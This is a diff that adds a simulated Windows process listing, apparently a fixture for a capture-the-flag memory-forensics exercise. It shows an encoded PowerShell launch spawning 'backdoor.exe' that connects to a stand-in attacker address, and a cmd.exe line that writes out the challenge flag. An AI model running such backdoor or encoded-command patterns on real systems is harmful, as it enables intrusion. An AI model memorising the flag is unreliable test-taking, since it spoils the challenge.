@@ -1,0 +1,20 @@
+PROCESS SNAPSHOT - victim-workstation
+Captured: 2024-03-12 14:45:23 UTC
+
+PID   PPID  Process Name          Command Line
+4     0     System               
+308   4     smss.exe             
+384   376   csrss.exe            
+432   376   wininit.exe          
+448   424   csrss.exe            
+508   432   services.exe         
+516   432   lsass.exe            
+624   508   svchost.exe          -k DcomLaunch
+692   508   svchost.exe          -k RPCSS
+756   508   svchost.exe          -k NetworkService
+1284  692   explorer.exe         C:\Windows\Explorer.exe
+1456  1284  notepad.exe          C:\Windows\notepad.exe secret.txt
+1672  1284  powershell.exe       powershell.exe -enc aGVsbG8gd29ybGQ=
+2048  1672  backdoor.exe         C:\temp\backdoor.exe -connect 203.0.113.47
+2156  2048  cmd.exe              cmd.exe /c echo CTF{m3m0ry_4n4lys1s_m4st3r_2024} > flag.txt
+2304  1284  chrome.exe           chrome.exe --type=renderer
